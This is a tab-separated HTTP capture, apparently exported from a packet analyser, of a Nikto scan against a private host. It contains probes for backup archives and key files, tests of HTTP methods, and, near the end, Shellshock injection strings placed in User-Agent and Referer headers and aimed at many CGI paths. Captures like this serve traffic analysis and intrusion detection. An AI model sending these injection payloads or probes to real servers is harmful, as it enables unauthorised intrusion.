http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									447						1	http://192.168.1.101/web/192.168.1.tar.bz2		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.1.tar.bz2
																	Keep-Alive										192.168.1.101									449						1	http://192.168.1.101/web/192.168.1.tar.bz2		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.1.tar.bz2
																	Keep-Alive										192.168.1.101									451						1	http://192.168.1.101/web/192_168_1_101.zip		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.zip
																	Keep-Alive										192.168.1.101									453						1	http://192.168.1.101/web/192_168_1_101.zip		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.zip
																	Keep-Alive										192.168.1.101									455						1	http://192.168.1.101/web/168.cer		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/168.cer
																	Keep-Alive										192.168.1.101									457						1	http://192.168.1.101/web/168.cer		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/168.cer
																	Keep-Alive										192.168.1.101									459						1	http://192.168.1.101/web/1921681101.zip		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/1921681101.zip
																	Keep-Alive										192.168.1.101									461						1	http://192.168.1.101/web/1921681101.zip		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/1921681101.zip
																	Keep-Alive										192.168.1.101									463						1	http://192.168.1.101/web/backup.tar.gz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/backup.tar.gz
																	Keep-Alive										192.168.1.101									465						1	http://192.168.1.101/web/backup.tar.gz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/backup.tar.gz
																	Keep-Alive										192.168.1.101									467						1	http://192.168.1.101/web/192_168_1_101.jks		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.jks
																	Keep-Alive										192.168.1.101									469						1	http://192.168.1.101/web/192_168_1_101.jks		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.jks
																	Keep-Alive										192.168.1.101									470						1	http://192.168.1.101/web/168.egg		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/168.egg
																	Keep-Alive										192.168.1.101									471						1	http://192.168.1.101/web/168.egg		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/168.egg
																	Keep-Alive										192.168.1.101									472						1	http://192.168.1.101/web/backup.egg		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/backup.egg
																	Keep-Alive										192.168.1.101									473						1	http://192.168.1.101/web/backup.egg		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/backup.egg
																	Keep-Alive										192.168.1.101									474						1	http://192.168.1.101/web/1921681.tgz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/1921681.tgz
																	Keep-Alive										192.168.1.101									475						1	http://192.168.1.101/web/1921681.tgz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/1921681.tgz
																	Keep-Alive										192.168.1.101									476						1	http://192.168.1.101/web/192168.tgz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192168.tgz
																	Keep-Alive										192.168.1.101									477						1	http://192.168.1.101/web/192168.tgz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192168.tgz
																	Keep-Alive										192.168.1.101									478						1	http://192.168.1.101/web/192.168.pem		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.pem
																	Keep-Alive										192.168.1.101									479						1	http://192.168.1.101/web/192.168.pem		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.pem
																	Keep-Alive										192.168.1.101									480						1	http://192.168.1.101/web/192168.cer		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192168.cer
																	Keep-Alive										192.168.1.101									481						1	http://192.168.1.101/web/192168.cer		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192168.cer
																	Keep-Alive										192.168.1.101									482						1	http://192.168.1.101/web/192_168_1_101.war		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.war
																	Keep-Alive										192.168.1.101									483						1	http://192.168.1.101/web/192_168_1_101.war		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.war
																	Keep-Alive										192.168.1.101									484						1	http://192.168.1.101/web/192.168.tar.gz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.tar.gz
																	Keep-Alive										192.168.1.101									485						1	http://192.168.1.101/web/192.168.tar.gz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.tar.gz
																	Keep-Alive										192.168.1.101									486						1	http://192.168.1.101/web/192.168.alz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.alz
																	Keep-Alive										192.168.1.101									487						1	http://192.168.1.101/web/192.168.alz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.alz
																	Keep-Alive										192.168.1.101									488						1	http://192.168.1.101/web/192.tar.gz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.tar.gz
																	Keep-Alive										192.168.1.101									489						1	http://192.168.1.101/web/192.tar.gz		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.tar.gz
																	Keep-Alive										192.168.1.101									490						1	http://192.168.1.101/web/192.168.1.pem		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.1.pem
																	Keep-Alive										192.168.1.101									491						1	http://192.168.1.101/web/192.168.1.pem		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192.168.1.pem
																	Keep-Alive										192.168.1.101									492						1	http://192.168.1.101/web/101.tar		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/101.tar
																	Keep-Alive										192.168.1.101									493						1	http://192.168.1.101/web/101.tar		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/101.tar
																	Keep-Alive										192.168.1.101									494						1	http://192.168.1.101/web/192_168_1_101.tar.lzma		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.tar.lzma
																	Keep-Alive										192.168.1.101									495						1	http://192.168.1.101/web/192_168_1_101.tar.lzma		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.tar.lzma
																	Keep-Alive										192.168.1.101									496						1	http://192.168.1.101/web/site.zip		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/site.zip
																	Keep-Alive										192.168.1.101									497						1	http://192.168.1.101/web/site.zip		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/site.zip
																	Keep-Alive										192.168.1.101									498						1	http://192.168.1.101/web/192168.tar		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192168.tar
																	Keep-Alive										192.168.1.101									499						1	http://192.168.1.101/web/192168.tar		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192168.tar
																	Keep-Alive										192.168.1.101									500						1	http://192.168.1.101/web/192_168_1_101.cer		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.cer
																	Keep-Alive										192.168.1.101									501						1	http://192.168.1.101/web/192_168_1_101.cer		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:sitefiles)				/web/192_168_1_101.cer
																	Keep-Alive										192.168.1.101									502						1	http://192.168.1.101/web/index.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.php
																	Keep-Alive										192.168.1.101									503						1	http://192.168.1.101/web/index.php3		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.php3
																	Keep-Alive										192.168.1.101									504						1	http://192.168.1.101/web/index.php4		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.php4
																	Keep-Alive										192.168.1.101									505						1	http://192.168.1.101/web/index.php5		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.php5
																	Keep-Alive										192.168.1.101									506						1	http://192.168.1.101/web/index.php7		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.php7
																	Keep-Alive										192.168.1.101									507						1	http://192.168.1.101/web/index.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.html
																	Keep-Alive										192.168.1.101									508						1	http://192.168.1.101/web/index.htm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.htm
																	Keep-Alive										192.168.1.101									510						1	http://192.168.1.101/web/index.shtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.shtml
																	Keep-Alive										192.168.1.101									511						1	http://192.168.1.101/web/index.cfm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.cfm
																	Keep-Alive										192.168.1.101									512						1	http://192.168.1.101/web/index.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.cgi
																	Keep-Alive										192.168.1.101									513						1	http://192.168.1.101/web/index.pl		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.pl
																	Keep-Alive										192.168.1.101									514						1	http://192.168.1.101/web/index.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.asp
																	Keep-Alive										192.168.1.101									515						1	http://192.168.1.101/web/index.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.aspx
																	Keep-Alive										192.168.1.101									516						1	http://192.168.1.101/web/default.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/default.asp
																	Keep-Alive										192.168.1.101									517						1	http://192.168.1.101/web/default.aspx		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/default.aspx
																	Keep-Alive										192.168.1.101									518						1	http://192.168.1.101/web/default.htm		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/default.htm
																	Keep-Alive										192.168.1.101									519						1	http://192.168.1.101/web/index.do		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.do
																	Keep-Alive										192.168.1.101									520						1	http://192.168.1.101/web/index.jhtml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.jhtml
																	Keep-Alive										192.168.1.101									521						1	http://192.168.1.101/web/index.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.jsp
																	Keep-Alive										192.168.1.101									522						1	http://192.168.1.101/web/index.xml		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:multiple_index)				/web/index.xml
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									523						1	http://192.168.1.101/web/nikto-test-nCzR77jL.html		PUT				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:put_del_test: PUT)				/web/nikto-test-nCzR77jL.html
																	Keep-Alive										192.168.1.101									524						1	http://192.168.1.101/web/~bin		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:apacheusers: known user)				/web/~bin
																	Keep-Alive										192.168.1.101									525						1	http://192.168.1.101/web/v2/_catalog		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:)				/web/v2/_catalog
																	Keep-Alive										192.168.1.101									526						1	http://192.168.1.101/web*		OPTIONS				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:httpoptions: OPTIONS *)				/web*
																	Keep-Alive										192.168.1.101									527						1	http://192.168.1.101/web/		OPTIONS				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:httpoptions: OPTIONS /)				/web/
																	Keep-Alive		0	0																						1	http:///web/		PROPFIND				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:httpoptions: PROPFIND)				/web/
																	Keep-Alive																									1			TRACE				HTTP/1.0																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:httpoptions: TRACE)				/web/
																	Keep-Alive										192.168.1.101														() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/
																	Keep-Alive										192.168.1.101									558					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/
																	Keep-Alive										192.168.1.101									562					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/admin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/admin.cgi
																	Keep-Alive										192.168.1.101									565					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/administrator.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/administrator.cgi
																	Keep-Alive										192.168.1.101									567					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/authLogin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/authLogin.cgi
																	Keep-Alive										192.168.1.101									569					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/bb-hist.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/bb-hist.sh
																	Keep-Alive										192.168.1.101									571					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/banner.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/banner.cgi
																	Keep-Alive										192.168.1.101									573					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/book.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/book.cgi
																	Keep-Alive										192.168.1.101									575					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/cgiinfo.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgiinfo.cgi
																	Keep-Alive										192.168.1.101									577					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/cgitest.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgitest.py
																	Keep-Alive										192.168.1.101									579					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/cgi_wrapper		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi_wrapper
																	Keep-Alive										192.168.1.101									581					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/contact.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/contact.cgi
																	Keep-Alive										192.168.1.101									583					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/count.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/count.cgi
																	Keep-Alive										192.168.1.101									585					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/defaultwebpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/defaultwebpage.cgi
																	Keep-Alive										192.168.1.101									586					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/download.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/download.cgi
																	Keep-Alive										192.168.1.101									587					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/entropysearch.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/entropysearch.cgi
																	Keep-Alive										192.168.1.101									588					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/env.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/env.cgi
																	Keep-Alive										192.168.1.101									589					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/environment.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/environment.cgi
																	Keep-Alive										192.168.1.101									590					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/ezmlm-browse		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ezmlm-browse
																	Keep-Alive										192.168.1.101									591					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/formmail.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/formmail.cgi
																	Keep-Alive										192.168.1.101									592					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/FormMail-clone.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/FormMail-clone.cgi
																	Keep-Alive										192.168.1.101									593					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/guestbook.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/guestbook.cgi
																	Keep-Alive										192.168.1.101									594					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/helpdesk.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/helpdesk.cgi
																	Keep-Alive										192.168.1.101									595					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/index.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/index.cgi
																	Keep-Alive										192.168.1.101									596					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/index.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/index.php
																	Keep-Alive										192.168.1.101									597					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/index.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/index.pl
																	Keep-Alive										192.168.1.101									598					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/info.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/info.cgi
																	Keep-Alive										192.168.1.101									599					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/info.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/info.sh
																	Keep-Alive										192.168.1.101									600					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/loadpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/loadpage.cgi
																	Keep-Alive										192.168.1.101									601					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/login.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/login.cgi
																	Keep-Alive										192.168.1.101									602					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/login.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/login.php
																	Keep-Alive										192.168.1.101									603					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/login.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/login.pl
																	Keep-Alive										192.168.1.101									604					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/pathtest.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/pathtest.pl
																	Keep-Alive										192.168.1.101									605					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php
																	Keep-Alive										192.168.1.101									606					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php4		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php4
																	Keep-Alive										192.168.1.101									607					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php5		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php5
																	Keep-Alive										192.168.1.101									608					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php-cgi
																	Keep-Alive										192.168.1.101									609					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php.cgi
																	Keep-Alive										192.168.1.101									610					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/php.fcgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/php.fcgi
																	Keep-Alive										192.168.1.101									611					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/printenv		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/printenv
																	Keep-Alive										192.168.1.101									612					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/restore_config.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/restore_config.cgi
																	Keep-Alive										192.168.1.101									613					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.101/web/ruby.rb		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/ruby.rb
